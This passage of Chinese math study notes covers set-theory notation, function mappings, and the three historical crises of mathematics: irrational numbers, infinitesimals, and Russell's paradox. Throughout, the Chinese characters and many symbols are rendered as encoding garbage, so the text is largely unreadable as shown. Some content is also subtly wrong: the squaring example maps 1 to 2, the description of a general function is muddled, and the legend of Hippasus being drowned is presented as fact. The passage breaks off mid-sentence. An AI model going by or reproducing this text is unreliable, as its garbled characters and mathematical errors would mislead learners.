      -  A ‚ãÉ B    Âπ∂ÈõÜÔºàunionÔºâÔºåÁî± A Âíå B ÈõÜÂêàÊâÄÊúâÂÖÉÁ¥†ÊûÑÊàêÁöÑÈõÜÂêà„ÄÇ
      -  A ‚äÜ B    Â≠êÈõÜÔºàsubset ofÔºâÔºåA ÊòØ B ÁöÑÂ≠êÈõÜ„ÄÇÈõÜÂêà B ÂåÖÂê´ÈõÜÂêà A„ÄÇ‰æãÂ¶ÇÔºö {1,2} ‚äÜ {1,2}
      -  A ‚äÇ B    ‰∏•Ê†ºÂ≠êÈõÜ„ÄÅÁúüÂ≠êÈõÜÔºàproper subsetÔºâ„ÄÇ‰æãÂ¶ÇÔºö {9,1} ‚äÇ {9,1,11}
      -  A ‚äÑ B    ÈùûÂ≠êÈõÜÔºåA ‰∏çÊòØ B ÁöÑÂ≠êÈõÜ„ÄÇ‰æãÂ¶ÇÔºö {9,66} ‚äÑ {9,14,28}
      -  A ‚äá B    Ë∂ÖÈõÜÔºàsuperset ofÔºâÔºåA ÊòØ B ÁöÑË∂ÖÈõÜ„ÄÇÈõÜÂêà A ÂåÖÂê´ÈõÜÂêà B„ÄÇ‰æãÂ¶ÇÔºö {9,1,11} ‚äá {9,1,11}
      -  A ‚äÉ B    ‰∏•Ê†ºË∂ÖÈõÜÔºàStrictly supersetÔºâÔºå‰æãÂ¶ÇÔºö {9,14,28} ‚äÉ {9,14}
      -  A ‚äÖ B    ÈùûË∂ÖÈõÜ„ÄÇ‰æãÂ¶ÇÔºö {9,14,28} ‚äÖ {9,66}„ÄÇ

      -  A ‚ñ≥ B ÊàñËÄÖ A ‚äï B  Ë°®Á§∫ÂØπÁß∞Â∑ÆÔºàsymmetric differenceÔºâÔºå(A-B) ‚ãÉ (B-A)„ÄÇ
      -  A ‚àí B ÊàñËÄÖ A ÔΩû B  Ë°®Á§∫Â∑ÆÈõÜÔºàDifferenceÔºâÔºåA ÈõÜÂêàÂÖ≥‰∫é B ÁöÑÂ∑ÆÈõÜ„ÄÇ
      -  A :sup:`c` Ë°•ÈõÜÔºàComplementÔºâÔºåÈõÜÂêà A ÂÖ≥‰∫éÊüêÈõÜÂêàÔºàÂÖ®ÈõÜÔºâÁöÑË°•ÈõÜ„ÄÇ

      -  a ‚àà A     ÂÖÉÁ¥† a Â±û‰∫é A ÈõÜÂêà„ÄÇ
      -  b ‚àâ A     ÂÖÉÁ¥† b ‰∏çÂ±û‰∫é A ÈõÜÂêà„ÄÇ

      -  A ‚àÜ B   ÂØπÁß∞Â∑ÆÂºÇÔºå‰ΩøÁî® ‚äñ Á¨¶Âè∑Ë°®Á§∫ÈÇ£‰∫õÂ±û‰∫é A ÂèàÂ±ûÊÄß BÔºå‰ΩÜ‰∏çÂ±û‰∫éÂÆÉ‰ª¨ÁöÑ‰∫§ÈõÜÁöÑÂØπË±°„ÄÇ

         A = {3,9,14}
         B = {1,2,3}
         A ‚àÜ B = {1,2,9,14}

      -  A √ó B   Á¨õÂç°Â∞îÁßØÔºàCartesian productÔºâÔºåA Âíå B ‰∏§ÈõÜ‰∏≠ÊâÄÊúâÂÖÉÁ¥†ÊúâÂ∫èÂØπÁöÑÈõÜÂêà„ÄÇ

         A = {a, b}
         B = {0, 1, 2}
         A √ó B = {(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}

   ÈõÜÂêàÈó¥ÁöÑÂÖÉÁ¥†ÔºåÈÄöËøáÂáΩÊï∞ÔºàÊò†Â∞ÑÁöÑ‰∏ÄÁßçÂÖ∑‰ΩìÂΩ¢ÂºèÔºâËßÑÂàô‰∫ßÁîüÂØπÂ∫îÂÖ≥Á≥ªÔºåÂ¶Ç‰∏ãÂõæÔºö

   ![ÂçïÂ∞Ñ„ÄÅÊª°Â∞ÑÂíåÂèåÂ∞Ñ](https://www.shuxuele.com/sets/images/function-mapping.svg)

   Âõæ‰∏≠ÔºåÂ∞Ü‰∏ÄÂØπÂ§öÁöÑÊÉÖÂÜµÂàó‰∏∫‰∏çÊòØÂáΩÊï∞ÁöÑ‰æãÂ≠êÔºå‰ΩÜÂú®ÊòØÂ§çÂèòÂáΩÊï∞ÔºåÂç≥‰ª•Â§çÊï∞‰Ωú‰∏∫Ëá™ÂèòÈáèÂíåÂõ†ÂèòÈáèÁöÑÂáΩÊï∞Ôºå
   Â∞±Â≠òÂú®‰∏ÄÂØπÂ§öÁöÑÊò†Â∞ÑÂÖ≥Á≥ª„ÄÇÂØπ‰∫é A„ÄÅB ‰∏§‰∏™ÈõÜÂêàÂÖÉÁ¥†‰πãÈó¥ÁöÑÊò†Â∞ÑÂ≠òÂú®ÂêÑÁßçÊÉÖÂÜµÔºö

   - ÈùûÂáΩÊï∞Êò†Â∞Ñ **Mapping**ÔºöA ÈõÜÂêàÂÖÉÁ¥†‰∏ÄÂØπÂ§öÊò†Â∞Ñ B ÈõÜÂêàÂÖÉÁ¥†Ôºõ
   - ‰∏ÄËà¨ÂáΩÊï∞ **Function**ÔºöA ÈõÜÂêàÂÖÉÁ¥†‰∏ÄÂØπ‰∏ÄÊò†Â∞Ñ B ÈõÜÂêàÂÖÉÁ¥†ÔºåB ÈõÜÂêàÊúâÂâ©‰ΩôÂÖÉÁ¥†Ôºõ
   - ÂçïÂ∞Ñ **Injective**ÔºöA ÈõÜÂêàÂÖÉÁ¥†‰∏ÄÂØπ‰∏ÄÊò†Â∞Ñ B ÈõÜÂêàÂÖÉÁ¥†Ôºå‰∏îÊ≤°ÊúâÂ§öÂØπ‰∏ÄÁöÑÊÉÖÂÜµÔºõ
   - Êª°Â∞Ñ **Surjective**ÔºöB ÈõÜÂêàÂÖÉÁ¥†Âú® A ÈõÜÂêà‰∏≠ÈÉΩÊúâ‰∏Ä‰∏™ÂÖÉÁ¥†ÂØπÂ∫îÔºõ
   - ÂèåÂ∞Ñ **Bijective**ÔºöA Âíå B ÈõÜÂêàÁöÑÂÖÉÁ¥†‰∏Ä‰∏ÄÂØπÂ∫îÔºåÊó¢ÊòØÂçïÂ∞ÑÂèàÊòØÊª°Â∞ÑÔºõ

   ÊØîÂ¶ÇÔºåÂØπ‰∫é A„ÄÅB ÈõÜÂêàÂàÜÂà´‰∏∫ {1, 2, 3} Âíå {2, 4, 9}ÔºåÊò†Â∞ÑËßÑÂàô‰∏∫"Âπ≥Êñπ"ÔºåÂç≥ ùëì(x) = x¬≤ÔºåÔºå
   ÈÇ£‰πàËøôÂ∞±ÊòØ‰∏Ä‰∏™Êª°Â∞ÑÔºåÂç≥‰∏Ä‰∏ÄÂØπÂ∫îÊò†Â∞ÑÂÖ≥Á≥ªÁöÑÂáΩÊï∞Ôºö

   - A ÈõÜÂêà‰Ωú‰∏∫ËæìÂÖ•Áß∞‰∏∫ÂÆö‰πâÂüü **Domain**Ôºõ
   - B ÈõÜÂêà‰Ωú‰∏∫ÂáΩÊï∞ÁöÑÂÆûÈôÖËæìÂá∫Áß∞‰∏∫ÂÄºÂüü **Range**Ôºõ
   - ËÄåÂáΩÊï∞ÂèØËÉΩÁöÑËæìÂá∫Áß∞‰∏∫ÂüπÂüü **Codomain**Ôºõ

   Êï∞Â≠¶Âè≤Âá∫Áé∞Ëøá‰∏âÊ¨°Âç±Êú∫ÔºàMathematical crisisÔºâÔºö

   *  ‰∏áÁâ©ÁöÜÊï∞Âç±Êú∫ÔºåËß£ÂÜ≥ÊñπÊ≥ïÊòØ‰øÆÊ≠£ÂéüÊù•Âü∫‰∫éÊúâÁêÜÊï∞ÁöÑÂü∫Á°Ä‰∏äÁöÑÁêÜËÆ∫ÈîôËØØÔºåÂπ∂ÊâøËÆ§Êó†ÁêÜÊï∞ÁöÑÂ≠òÂú®Ôºõ
   *  ÂæÆÁßØÂàÜ‰∏≠Êó†Á©∑Â∞èÂç±Êú∫ÔºåËß£ÂÜ≥ÊñπÊ≥ïÊòØÊûÅÈôêËÆ∫Ôºàtheory of limitationÔºâÔºõ
   *  ÈõÜÂêàËÆ∫ÔºàÁé∞‰ª£Êï∞Â≠¶Âü∫Á°ÄËØ≠Ë®ÄÔºâÂç±Êú∫ÔºåÈÄöËøáÈôêÂà∂Ëá™ÂåÖÂê´Ôºàself-referenceÔºâÈõÜÂêàÁöÑÂÆö‰πâÂõûÈÅøÔºõ

   ÂÖ¨ÂÖÉÂâç 500 Âπ¥Â∑¶Âè≥ÔºåÂè§Â∏åËÖäÊØïËææÂì•ÊãâÊñØÂ≠¶Ê¥æ‰Ωú‰∏∫‰∏Ä‰∏™ÂîØÂøÉ‰∏ª‰πâÂ≠¶Ê¥æÔºåËÆ§‰∏∫‚Äú‰∏áÁâ©ÁöÜÊï∞‚ÄùÔºåÊï∞Â≠¶Áü•ËØÜÊòØ
   ÂèØÈù†ÁöÑ„ÄÅÂáÜÁ°ÆÁöÑÔºåËÄå‰∏îÂèØ‰ª•Â∫îÁî®‰∫éÁé∞ÂÆûÁöÑ‰∏ñÁïåÔºåÊï∞Â≠¶Áü•ËØÜÁî±‰∫éÁ∫ØÁ≤πÁöÑÊÄùÁª¥ËÄåËé∑ÂæóÔºå‰∏çÈúÄË¶ÅËßÇÂØü„ÄÅÁõ¥ËßâÂíå
   Êó•Â∏∏ÁªèÈ™å„ÄÇÊ≠§Êï∞ÊåáÊï¥Êï∞ Integer„ÄÇÂè§Â∏åËÖäÂä†‰∫Ü‚ÄúÂè§‚ÄùÂ≠óÂâçÁºÄÊòØ‰∏∫‰∫ÜÂå∫Âà´Áé∞Âú®ÁöÑÂ∏åËÖäÂõΩ„ÄÇ

   ÊçÆÁé∞Â≠ò„ÄäÂá†‰ΩïÂéüÊú¨„ÄãÊúÄÂè§ËÄÅÁöÑÂÆåÊï¥ÊäÑÊú¨ÔºåÊó∂Èó¥Â§ßÊ¶ÇÊòØÂÖ¨ÂÖÉ 9 ‰∏ñÁ∫™Â∑¶Âè≥ÔºåËÆ∞ÂΩï‰∫ÜÊØïËææÂì•ÊãâÊñØÈÄöËøáÊºîÁªéÊ≥ïËØÅÊòé‰∫Ü
   Áõ¥Ëßí‰∏âËßíÂΩ¢ÊñúËæπÂπ≥ÊñπÁ≠â‰∫é‰∏§Áõ¥ËßíËæπÂπ≥Êñπ‰πãÂíåÔºåÂç≥ÊØïËææÂì•ÊãâÊñØÂÆöÁêÜÔºàPythagorean theoremÔºâ„ÄÇÂ¶Ç‰∏ãÂõæÔºå
   ‰ªñËÆæËÆ°‰∫ÜÂõõ‰∏™Áõ∏ÂêåÁöÑ‰∏âËßíÂΩ¢Ôºå‰ª•Âèä‰∏§‰∏™ÊåâÁõ¥ËßíËæπÈïøÂà∂‰ΩúÁöÑÊ≠£ÊñπÂΩ¢ÔºåÂ∞ÜÂÆÉ‰ª¨ÊãºÂáëÊàê‰∏§‰∏™Áõ∏Á≠âÁöÑÂ§ßÊ≠£ÊñπÂΩ¢Ôºå
   Â∞Ü‰∏âËßíÂΩ¢ÁßªËµ∞ÔºåÂâ©‰∏ãÁöÑÈÉ®ÂàÜ‰πüÂêåÊ†∑Áõ∏Á≠âÔºàÁ∫¢Ëâ≤ÈÉ®ÂàÜÔºâÔºö

   .. image:: ./pictures/Pythagorean_theorem.svg

   ÁÑ∂ËÄåÔºåËøô‰∏™ÂÆöÁêÜÁöÑÂÖ¨Â∏ÉÂ∞ÜÂºïÂØº‰ªñÁöÑÂ≠¶ÁîüÂ∏å‰ºØÊñØÊèêÂá∫‰∏Ä‰∏™Ëá¥ÂëΩÁöÑÁñëÈóÆÔºÅ

   ÊúâÁêÜÊï∞Ôºàrational numberÔºâÊúâ‰∏ÄÁßçÁÆÄÂçïÁöÑÂá†‰ΩïËß£ÈáäÔºö‰ΩøÁî®Ê∞¥Âπ≥Êï∞ËΩ¥‰∏äÊ†áÂá∫‰∏ÄÊÆµÁ∫øÊÆµ‰Ωú‰∏∫Âçï‰ΩçÈïøÔºå
   Â¶ÇÊûú‰ª§ÂÆÉÁöÑÂÆöÁ´ØÁÇπÂíåÂè≥Á´ØÁÇπÂàÜÂà´Ë°®Á§∫Êï∞ 0 Âíå 1ÔºåÂàôÂèØÁî®ËøôÊù°Áõ¥Á∫ø‰∏äÁöÑÈó¥Èöî‰∏∫Âçï‰ΩçÈïøÁöÑÁÇπÁöÑÈõÜÂêàÊù•Ë°®Á§∫Êï¥Êï∞Ôºå
   Ê≠£Êï¥Êï∞Âú® 0 ÁöÑÂè≥ËæπÔºåË¥üÊï¥Êï∞Âú® 0 ÁöÑÂ∑¶Ëæπ„ÄÇ‰ª• q ‰∏∫ÂàÜÊØçÁöÑÂàÜÊï∞ÔºåÂèØ‰ª•Áî®ÊØè‰∏ÄÂçï‰ΩçÈó¥ÈöîÂàÜ‰∏∫ q Á≠âÂàÜÁöÑÁÇπË°®Á§∫„ÄÇ
   ‰∫éÊòØÔºåÊØè‰∏Ä‰∏™ÊúâÁêÜÊï∞ÈÉΩÂØπÂ∫îÁùÄÁõ¥Á∫ø‰∏äÁöÑ‰∏Ä‰∏™ÁÇπ„ÄÇ

   ÂÖ¨ÂÖÉÂâç 400 Âπ¥ÔºåÂ∏å‰ºØÊñØÔºàHippasusÔºâ‰æùÈù†ÂèçËØÅÊ≥ïÂèëÁé∞Êó†ÁêÜÊï∞ÔºöÁõ¥Á∫ø‰∏äÂ≠òÂú®‰∏çÂØπÂ∫î‰ªª‰ΩïÊúâÁêÜÊï∞ÁöÑÁÇπÔºå
   ÂºïÂèëÊï∞Â≠¶Âè≤‰∏äÁ¨¨‰∏ÄÊ¨°Êï∞Â≠¶Âç±Êú∫„ÄÇÂØπ‰∫éÂÖ®ÈÉ®‰æùÈù†Êï¥Êï∞ÁöÑÊØïÊ∞èÂì≤Â≠¶ÔºåÂΩ¢Êàê‰∏ÄÊ¨°Ëá¥ÂëΩÁöÑÊâìÂáª„ÄÇÊó†ÁêÜÊï∞ÁöÑÂèëÁé∞Ôºå
   ÊòØÊØïÊ∞èÂ≠¶Ê¥æÁöÑÊúÄ‰ºüÂ§ßÊàêÂ∞±‰πã‰∏ÄÔºå‰πüÊòØÊï∞Â≠¶Âè≤‰∏äÁöÑÈáçË¶ÅÈáåÁ®ãÁ¢ë„ÄÇ‰ªñ‰ª¨ËØÅÊòé‰∫ÜÊï∞ËΩ¥‰∏äÂ≠òÂú®ÁÇπ p ‰∏çÂØπÂ∫î‰∫éÊúâÁêÜÊï∞Ôºå
   ËøôÈáåË∑ùÁ¶ª op Á≠â‰∫éËæπÈïø‰∏∫Âçï‰ΩçÈïøÁöÑÊ≠£ÊñπÂΩ¢ÁöÑÂØπËßíÁ∫øÁöÑË∑ùÁ¶ªÔºåÂç≥ ‚àö2 Ëøô‰∏™Êï∞„ÄÇ‰∫éÊòØÂ∞±ÂøÖÈ°ªÂèëÊòéÊñ∞ÁöÑÊï∞ÂØπÂ∫î
   ËøôÊ†∑ÁöÑÁÇπÔºåÂπ∂‰∏îÂõ†‰∏∫Ëøô‰∫õÊï∞‰∏çÂèØËÉΩÊòØÊúâÁêÜÊï∞ÔºåÂè™Â•ΩÁß∞ÂÆÉ‰ª¨‰∏∫Êó†ÁêÜÊï∞Ôºàirrational numberÔºâ„ÄÇ

   ‰∏∫‰∫ÜÁª¥Êä§Â≠¶Ê¥æÁöÑÂ®Å‰ø°Ôºå‰ªñ‰ª¨‰∏•ÂØÜÂ∞ÅÈîÅ‰∫ÜÂ∏åÂ∏ïÁ¥¢ÊñØÁöÑÂèëÁé∞ÔºåÂπ∂ÂØπÊâÄÊúâÊ≥ÑÈú≤Âá∫ÂéªÁöÑ‰ø°ÂæíÂ§Ñ‰ª•ÊûÅÂàë‚Äî‚ÄîÊ¥ªÂüã„ÄÇ
   Â∏åÂ∏ïÁ¥¢ÊñØÂê¨Âà∞È£éÂ£∞ÂêéÔºåÁ´ãÂç≥ÈÄÉË∑ëÂà∞‰∫ÜÂõΩÂ§ñ„ÄÇÂú®ÂõΩÂ§ñÊµÅÊµ™‰∫ÜÂá†Âπ¥ÂêéÔºåÁî±‰∫éÊÄùÂøµÂÆ∂‰π°Ôºå‰ªñÂÅ∑ÂÅ∑Âú∞ËøîÂõû‰∫ÜÂ∏åËÖä„ÄÇ
   Áªà‰∫éÂú®Âú∞‰∏≠Êµ∑ÁöÑËàπ‰∏äË¢´ÊØïËææÂì•ÊãâÊñØÁöÑÂø†ÂÆûÈó®ÂæíÂèëÁé∞ÔºåÂπ∂ÊäïÊµ∑Ê∑πÊ≠ª„ÄÇÊâÄ‰ª•ÔºåÂäüÂà©ÁöÑÊïÖ‰∫∫ÈÉΩÊáÇÂæóÔºåËß£ÂÜ≥‰∏ç‰∫Ü
   ÈóÆÈ¢òÂ∞±ÊääÊèêÂá∫ÈóÆÈ¢òÁöÑ‰∫∫Ëß£ÂÜ≥ÊéâÔºÅ


   ÂçÅ‰∏É‰∏ñÁ∫™Êó∂ÔºåÁî±‰∫éÁâ©ÁêÜÂ≠¶‰∏≠Ê±ÇËß£ËøêÂä®ÁöÑÈóÆÈ¢òË∂äÊù•Ë∂äÂ§öÔºåÂØπÂæÆÁßØÂàÜÁöÑÈúÄÊ±ÇÂèòÂæóË∂äÊù•Ë∂äËø´Âàá„ÄÇÂú®ËøôÊó∂ÔºåËã±ÂõΩ
   ËëóÂêçÊï∞Â≠¶ÂÆ∂„ÄÅÁâ©ÁêÜÂ≠¶ÂÆ∂ÁâõÈ°øÂíåÂæ∑ÂõΩÂì≤Â≠¶ÂÆ∂„ÄÅÊï∞Â≠¶ÂÆ∂Ëé±Â∏ÉÂ∞ºËå®ÂêÑËá™Áã¨Á´ãÂèëÊòé‰∫ÜÂæÆÁßØÂàÜ„ÄÇÁâõÈ°øÂú®„ÄäÊ±ÇÁßØÊúØ„Äã‰∏ÄÊñá
   ‰∏≠‰ΩøÁî®ËÆ∫ËØÅÂæóÂá∫‰∫Ü y = x‚Åø ÁöÑÂØºÊï∞ÊòØ nx‚ÅΩ‚Åø‚Åª¬π‚Åæ„ÄÇËøô‰∏™ÊñπÊ≥ïÂíåÁªìÊûúÂú®ÂÆûÈôÖÂ∫îÁî®‰∏≠ÈùûÂ∏∏ÊàêÂäüÔºåÂ§ßÂ§ßÊé®Ëøõ‰∫Ü
   ÁßëÂ≠¶ÊäÄÊúØÁöÑÂèëÂ±ï„ÄÇËôΩÁÑ∂Ëøô‰∏™ÁªìÊûúÊòØÊ≠£Á°ÆÁöÑÔºå‰ΩÜÊòØÁâõÈ°øÁöÑËÆ∫ËØÅËøáÁ®ãÂÆûÈôÖ‰∏äÂ≠òÂú®ÂæàÂ§ßÁöÑÈóÆÈ¢òÔºåÂú®Â§ÑÁêÜÂ¢ûÈáè‰∏≠ÁöÑ
   ‚ÄúÊó†Á©∑Â∞è‚ÄùËøô‰∏™Èáè‰∏äÔºåÁâõÈ°øÂ∞ÜÂÖ∂Áõ¥Êé•Áï•Âéª‰∫Ü‰∫ã„ÄÇ

   Â¶ÇÊûúÂáΩÊï∞ y = ùëì(x) Âú®ÂºÄÂå∫Èó¥ÂÜÖÊØè‰∏ÄÁÇπÈÉΩÂèØÂØºÔºåÂ∞±Áß∞ÂáΩÊï∞ ùëì(x) Âú®Âå∫Èó¥ÂÜÖÂèØÂØº„ÄÇËøôÊó∂ÂáΩÊï∞ y = ùëì(x)
   ÂØπ‰∫éÂå∫Èó¥ÂÜÖÁöÑÊØè‰∏Ä‰∏™Á°ÆÂÆöÁöÑ x ÂÄºÔºåÈÉΩÂØπÂ∫îÁùÄ‰∏Ä‰∏™Á°ÆÂÆöÁöÑÂØºÊï∞ÂÄºÔºåËøôÂ∞±ÊûÑÊàê‰∏Ä‰∏™Êñ∞ÁöÑÂáΩÊï∞ÔºåÁß∞Ëøô‰∏™ÂáΩÊï∞
   ‰∏∫ÂéüÊù•ÂáΩÊï∞ y = ùëì(x) ÁöÑÂØºÂáΩÊï∞ÔºåËÆ∞‰Ωú y' ÊàñËÄÖ ùëì'(x) ÊàñËÄÖ dy/dx Êàñ df(x)/dxÔºåÁÆÄÁß∞ÂØºÊï∞„ÄÇ

   ÂØºÂáΩÊï∞Ôºàderivative functionÔºâÊòØÁî®‰∫éÂú®ÂæÆÁßØÂàÜ‰∏≠ÔºåÊèèËø∞‰∏Ä‰∏™ÂáΩÊï∞Êõ≤Á∫øÁöÑÊñúÁéáÂèòÂåñÁéáÁöÑÂáΩÊï∞„ÄÇ
   ÂÆÉË°®Á§∫‰∫ÜÂéüÂáΩÊï∞Âú®ÊØè‰∏™ÁÇπÁöÑÂàáÁ∫øÊñúÁéá„ÄÇ

   ÂáΩÊï∞ÂèØÂØºÊÄß‰∏éÂØºÊï∞„ÄÅËøûÁª≠ÊÄß‰πãÈó¥ÁöÑÈÄªËæëÂÖ≥Á≥ªÂ¶Ç‰∏ãÔºö

      ÂáΩÊï∞ÁöÑÂØºÊï∞ËøûÁª≠ => ÂáΩÊï∞ÂèØÂØº=>  ÂáΩÊï∞ËøûÁª≠

   ‰πãÊâÄ‰ª•ÂèñÂçïÂêëÁÆ≠Â§¥ÔºåÊòØÂõ†‰∏∫ÔºåÁÆ≠Â§¥ÂêéÈù¢ÁöÑÊØè‰∏Ä‰∏™Êù°‰ª∂ÈÉΩ‰ªÖ‰ªÖÊòØÂâç‰∏Ä‰∏™ÁöÑÂøÖË¶ÅÊù°‰ª∂ÔºåËÄå‰∏çÊòØÂÖÖÂàÜÊù°‰ª∂„ÄÇ

   Weierstrass ÊõæÊûÑÈÄ†Âá∫Èó≠Âå∫Èó¥‰∏äÂ§ÑÂ§ÑËøûÁª≠‰ΩÜÂ§ÑÂ§Ñ‰∏çÂèØÂØºÁöÑÂáΩÊï∞„ÄÇÂà©Áî®Ë¥ùÂ∞îÁ∫≤ÂÆöÁêÜÔºåÂèØ‰ª•ÂæóÂà∞Èó≠Âå∫Èó¥‰∏ä
   Â§ÑÂ§ÑËøûÁª≠‰ΩÜÂ§ÑÂ§Ñ‰∏çÂèØÂØºÁöÑÂáΩÊï∞‰∏ç‰ªÖÂ≠òÂú®ÔºåËÄå‰∏îÈùûÂ∏∏‰πãÂ§öÔºåÂΩìÁÑ∂ËøôÊ†∑ÁöÑÂáΩÊï∞ÊûÑÈÄ†‰πüÂæàÂõ∞Èöæ„ÄÇ

   ÁâõÈ°øÂú®ËØÅÊòéËøáÁ®ã‰∏≠Áï•ÂéªÁöÑÊó†Á©∑Â∞èÈáèÂπ∂‰∏çÊÄªÊòØÈõ∂ÔºåËøôÂ∞±ÂºïËµ∑‰∏Ä‰∏™ÁüõÁõæ„ÄÇÂ¶ÇÊûúÂÆÉ‰∏çÊòØÈõ∂ÔºåÈÇ£‰πàÁâõÈ°øÂ∞ÜÂÖ∂Áõ¥Êé•
   Áï•ÂéªÁöÑÊñπÊ≥ïÂ∞±‰∏çÂ§ü‰∏•Ë∞®ÔºõÂ¶ÇÊûúÂÆÉÊòØÈõ∂ÔºåÈÇ£ÂÆÉÂ∞±‰∏çËÉΩË¢´ÊîæÂú®ÂàÜÊØç‰∏≠„ÄÇÁâõÈ°øÂØπÂÆÉÊõæ‰ΩúËøá‰∏âÁßç‰∏çÂêåËß£ÈáäÔºö

      *  1669 Âπ¥ËØ¥ÂÆÉÊòØ‰∏ÄÁßçÂ∏∏ÈáèÔºõ
      *  1671 Âπ¥ÂèàËØ¥ÂÆÉÊòØ‰∏Ä‰∏™Ë∂ã‰∫éÈõ∂ÁöÑÂèòÈáèÔºõ
      *  1676 Âπ¥ÂÆÉË¢´‚Äú‰∏§‰∏™Ê≠£Âú®Ê∂àÈÄùÁöÑÈáèÁöÑÊúÄÁªàÊØî‚ÄùÊâÄ‰ª£Êõø„ÄÇ

   ‰ΩÜÊòØÔºå‰ªñÂßãÁªàÊó†Ê≥ïËß£ÂÜ≥‰∏äËø∞ÁüõÁõæ„ÄÇËé±Â∏ÉÂ∞ºËå®ÊõæËØïÂõæÁî®ÂíåÊó†Á©∑Â∞èÈáèÊàêÊØî‰æãÁöÑÊúâÈôêÈáèÁöÑÂ∑ÆÂàÜÊù•‰ª£ÊõøÊó†Á©∑Â∞èÈáèÔºå
   ‰ΩÜÊòØ‰ªñ‰πüÊ≤°ÊúâÊâæÂà∞‰ªéÊúâÈôêÈáèËøáÊ∏°Âà∞Êó†Á©∑Â∞èÈáèÁöÑÊ°•Ê¢Å„ÄÇ‰∫éÊòØÂú®ÊûÅÈôêÁöÑÈóÆÈ¢òÂ∞öÊú™Ë¢´ÂÆåÂÖ®ËÆ§Ê∏Ö‰πãÂâçÔºåÂæÆÁßØÂàÜÁöÑ
   Âü∫Á°ÄÈóÆÈ¢ò‰∏ÄÁõ¥ÂèóÂà∞‰∏Ä‰∫õ‰∫∫ÁöÑÊâπÂà§ÂíåÊîªÂáªÔºåÂÖ∂‰∏≠ÊúÄÊúâÂêçÁöÑÊòØË¥ùÂÖãËé±‰∏ªÊïôÂú® 1734 Âπ¥ÁöÑÊîªÂáª„ÄÇË¥ùÂÖãËé±‰∏ªÊïôÊòØ
   Ëã±ÂõΩËëóÂêçÁöÑÂì≤Â≠¶ÂÆ∂Ôºå1734Âπ¥Ôºå‰ªñÂú®„ÄäÂàÜÊûêÂÆ∂ÊàñËá¥‰∏Ä‰Ωç‰∏ç‰ø°Á•ûÁöÑÊï∞Â≠¶ÂÆ∂„Äã‰∏≠ÊòéÁ°ÆÊåáÂá∫ÁâõÈ°øËÆ∫ËØÅÁöÑÈÄªËæëÈóÆÈ¢òÔºå
   ‰∏∫Êó†Á©∑Â∞èÈáèÁöÑËé´ÂêçÊ∂àÂ§±ËÄåË¥®Áñë„ÄÇ

   ‰∫ãÂÆû‰∏äÊó†Á©∑Â∞èÈáè‰∏çÊòØ‰∏Ä‰∏™Êï∞ÔºåÂÆÉÊòØ‰∏Ä‰∏™Êó†ÈôêË∂ãÂêëÈõ∂ÁöÑËøáÁ®ãÔºåÂõ†Ê≠§ÈúÄË¶ÅÂºïÂÖ•ÊûÅÈôêËÆ∫Êù•Ëß£ÂÜ≥Êó†Á©∑Â∞èÈóÆÈ¢ò„ÄÇ


   ÊúÄËøë‰∏ÄÊ¨°Âç±Êú∫‰∏éÈõÜÂêàËÆ∫ÊúâÂÖ≥„ÄÇÂçÅ‰πù‰∏ñÁ∫™Êú´ÔºåÂæ∑ÂõΩÊï∞Â≠¶ÂÆ∂Â∫∑ÊâòÂ∞î(1845~1918)ÂàõÁ´ã‰∫ÜÈõÜÂêàËÆ∫„ÄÇ 
   ÁΩóÁ¥†ÊÇñËÆ∫ÔºàRussell's paradoxÔºâÔºå‰πüÁß∞‰∏∫ÁêÜÂèëÂ∏àÊÇñËÆ∫ÔºåÊòØËã±ÂõΩÂì≤Â≠¶ÂÆ∂ÁΩóÁ¥†‰∫é 1901 Âπ¥ÊèêÂá∫ÁöÑÊÇñËÆ∫Ôºå
   ‰∏Ä‰∏™ÂÖ≥‰∫éÁ±ªÁöÑÂÜÖÊ∂µÈóÆÈ¢ò„ÄÇÁΩóÁ¥†ÊÇñËÆ∫ÂΩìÊó∂ÊèêÂá∫Ëá™Âê´ÈõÜÂêàË¥®Áñë‰∫ÜÈõÜÂêàËÆ∫ÁöÑÁº∫Èô∑ÔºåÈÄ†ÊàêÁ¨¨‰∏âÊ¨°Êï∞Â≠¶Âç±Êú∫ÔºåËá≥‰ªäÊó†Ëß£Ôºå
   Âè™ËÉΩÈÄöËøá‰øÆÊîπÈõÜÂêàÂÆö‰πâÊù•ÈÅøÂÖçÂá∫Áé∞ÁΩóÁ¥†ÊÇñËÆ∫„ÄÇ

      Âú®Êüê‰∏™ÂüéÂ∏Ç‰∏≠Êúâ‰∏Ä‰ΩçÁêÜÂèëÂ∏àÔºå‰ªñÁöÑÂπøÂëäËØçÊòØËøôÊ†∑ÂÜôÁöÑÔºö‚ÄúÊú¨‰∫∫ÁöÑÁêÜÂèëÊäÄËâ∫ÂçÅÂàÜÈ´òË∂ÖÔºåË™âÊª°ÂÖ®Âüé„ÄÇ
      ÊàëÂ∞Ü‰∏∫Êú¨ÂüéÊâÄÊúâ‰∏çÁªôËá™Â∑±ÂàÆËÉ°Â≠êÁöÑ‰∫∫ÂàÆËÉ°Â≠êÔºåÊàë‰πüÂè™ÁªôËøô‰∫õ‰∫∫ÂàÆËÉ°Â≠ê„ÄÇÊàëÂØπÂêÑ‰ΩçË°®Á§∫ÁÉ≠ËØöÊ¨¢ËøéÔºÅ‚Äù
      Êù•Êâæ‰ªñÂàÆËÉ°Â≠êÁöÑ‰∫∫ÁªúÁªé‰∏çÁªùÔºåËá™ÁÑ∂ÈÉΩÊòØÈÇ£‰∫õ‰∏çÁªôËá™Â∑±ÂàÆËÉ°Â≠êÁöÑ‰∫∫„ÄÇÂèØÊòØÔºåÊúâ‰∏ÄÂ§©ÔºåËøô‰ΩçÁêÜÂèëÂ∏à‰ªé
      ÈïúÂ≠êÈáåÁúãËßÅËá™Â∑±Èïø‰∫ÜËÉ°Â≠êÔºå‰ªñÊú¨ËÉΩÂú∞ÊäìËµ∑‰∫ÜÂâÉÂàÄÔºå‰Ω†‰ª¨Áúã‰ªñËÉΩ‰∏çËÉΩÁªô‰ªñËá™Â∑±ÂàÆËÉ°Â≠êÂë¢ÔºüÂ¶ÇÊûú‰ªñ‰∏ç
      Ëá™Â∑±ÂàÆËÉ°Â≠êÔºå‰ªñÂ∞±Â±û‰∫é‚Äú‰∏çËá™Â∑±ÂàÆËÉ°Â≠êÁöÑ‰∫∫‚ÄùÔºå‰ªñÂ∞±Ë¶ÅÁªôËá™Â∑±ÂàÆËÉ°Â≠êÔºåËÄåÂ¶ÇÊûú‰ªñÁªôËá™Â∑±ÂàÆËÉ°Â≠êÂë¢Ôºü
